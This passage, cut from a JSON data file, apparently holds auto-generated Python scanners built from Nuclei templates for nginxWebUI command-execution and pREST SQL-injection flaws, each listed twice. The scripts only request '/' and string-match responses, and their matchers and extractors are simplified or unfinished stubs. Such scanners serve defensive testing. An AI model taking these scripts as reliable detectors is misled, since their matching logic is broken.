        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: nginx-webui-rce\nName: nginxWebUI ≤ 3.5.0 - Remote Command Execution\nSeverity: critical\nDescription: There is a command execution vulnerability in the nginxWebUI backend. After logging in to the backend, the attacker can execute any command to obtain server permissions.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_nginx_webui_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"nginx-webui-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"nginxWebUI ≤ 3.5.0 - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['uid=\\\\\\\\d+\\\\\\\\(([^)]+)\\\\\\\\) gid=\\\\\\\\d+\\\\\\\\(([^)]+)\\\\\\\\)'] | mot(s) 'application/json' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['uid=\\\\\\\\d+\\\\\\\\(([^)]+)\\\\\\\\) gid=\\\\\\\\d+\\\\\\\\(([^)]+)\\\\\\\\)', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"nginxWebUI ≤ 3.5.0 - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_nginx_webui_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "nginx",
          "nginxwebui",
          "webui",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_nginxwebui_runcmd_rce",
        "name": "nginxWebUI ≤ 3.5.0 runCmd - Remote Command Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "nginxWebUI’s runCmd feature and is caused by incomplete validation of user input. Attackers can exploit the vulnerability by crafting malicious data to execute arbitrary commands on a vulnerable server without authorization.",
        "severity": "critical",
        "detection": "[AND] regex ['uid=\\\\d+\\\\(([^)]+)\\\\) gid=\\\\d+\\\\(([^)]+)\\\\)'] | mot(s) 'application/json' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: nginxwebui-runcmd-rce\nName: nginxWebUI ≤ 3.5.0 runCmd - Remote Command Execution\nSeverity: critical\nDescription: nginxWebUI’s runCmd feature and is caused by incomplete validation of user input. Attackers can exploit the vulnerability by crafting malicious data to execute arbitrary commands on a vulnerable server without authorization.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_nginxwebui_runcmd_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"nginxwebui-runcmd-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"nginxWebUI ≤ 3.5.0 runCmd - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['uid=\\\\\\\\d+\\\\\\\\(([^)]+)\\\\\\\\) gid=\\\\\\\\d+\\\\\\\\(([^)]+)\\\\\\\\)'] | mot(s) 'application/json' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['uid=\\\\\\\\d+\\\\\\\\(([^)]+)\\\\\\\\) gid=\\\\\\\\d+\\\\\\\\(([^)]+)\\\\\\\\)', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"nginxWebUI ≤ 3.5.0 runCmd - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_nginxwebui_runcmd_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: nginxwebui-runcmd-rce\nName: nginxWebUI ≤ 3.5.0 runCmd - Remote Command Execution\nSeverity: critical\nDescription: nginxWebUI’s runCmd feature and is caused by incomplete validation of user input. Attackers can exploit the vulnerability by crafting malicious data to execute arbitrary commands on a vulnerable server without authorization.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_nginxwebui_runcmd_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"nginxwebui-runcmd-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"nginxWebUI ≤ 3.5.0 runCmd - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['uid=\\\\\\\\d+\\\\\\\\(([^)]+)\\\\\\\\) gid=\\\\\\\\d+\\\\\\\\(([^)]+)\\\\\\\\)'] | mot(s) 'application/json' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['uid=\\\\\\\\d+\\\\\\\\(([^)]+)\\\\\\\\) gid=\\\\\\\\d+\\\\\\\\(([^)]+)\\\\\\\\)', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"nginxWebUI ≤ 3.5.0 runCmd - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_nginxwebui_runcmd_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "nginx",
          "nginxwebui",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_prest_sqli_auth_bypass",
        "name": "pREST < 1.5.4 - SQL Injection Via Authentication Bypass",
        "language": "Python",
        "famille": "WebApp",
        "description": "An authentication bypass vulnerability was introduced by changing the JWT whitelist configuration to use a regex pattern, allowing unauthorized access to any path containing /auth and leading to SQL Injection.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'pq: invalid input syntax for type integer: \\\"PostgreSQL ' | mot(s) 'application/json'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "database",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: database",
            "default": "{{database}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: prest-sqli-auth-bypass\nName: pREST < 1.5.4 - SQL Injection Via Authentication Bypass\nSeverity: critical\nDescription: An authentication bypass vulnerability was introduced by changing the JWT whitelist configuration to use a regex pattern, allowing unauthorized access to any path containing /auth and leading to SQL Injection.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_prest_sqli_auth_bypass:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"prest-sqli-auth-bypass\"\n    SEVERITY = \"critical\"\n    NAME = \"pREST < 1.5.4 - SQL Injection Via Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'pq: invalid input syntax for type integer: \\\\\"PostgreSQL \\' | mot(s) \\'application/json\\''\n\n        # Simple word matcher simulation\n        matchers = ['pq: invalid input syntax for type integer: \\\\\"PostgreSQL ', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"pREST < 1.5.4 - SQL Injection Via Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_prest_sqli_auth_bypass(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: prest-sqli-auth-bypass\nName: pREST < 1.5.4 - SQL Injection Via Authentication Bypass\nSeverity: critical\nDescription: An authentication bypass vulnerability was introduced by changing the JWT whitelist configuration to use a regex pattern, allowing unauthorized access to any path containing /auth and leading to SQL Injection.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_prest_sqli_auth_bypass:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"prest-sqli-auth-bypass\"\n    SEVERITY = \"critical\"\n    NAME = \"pREST < 1.5.4 - SQL Injection Via Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'pq: invalid input syntax for type integer: \\\\\"PostgreSQL \\' | mot(s) \\'application/json\\''\n\n        # Simple word matcher simulation\n        matchers = ['pq: invalid input syntax for type integer: \\\\\"PostgreSQL ', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"pREST < 1.5.4 - SQL Injection Via Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_prest_sqli_auth_bypass(\n        target=args.target,\n        proxy=args.proxy,\n        